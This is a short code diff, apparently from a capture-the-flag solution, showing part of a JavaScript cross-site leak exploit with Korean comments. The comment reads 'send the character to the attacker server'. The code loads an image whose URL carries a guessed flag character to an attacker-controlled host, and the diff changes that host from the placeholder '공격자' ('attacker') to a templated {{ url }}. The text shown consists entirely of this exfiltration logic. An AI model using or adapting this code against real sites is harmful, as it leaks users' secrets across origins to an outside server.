@@ -27,7 +27,7 @@
             // 🔹 프레임 수가 1 이상이면 공격자 서버로 문자 전송
             if (frameCount >= 1) {
                 const img = new Image();
-                img.src = `공격자?flag=${encodeURIComponent(chr)}`;
+                img.src = `{{ url }}`+`?flag=${encodeURIComponent(chr)}`;
             }
 
             // 너무 많이 쌓이지 않도록 iframe 제거
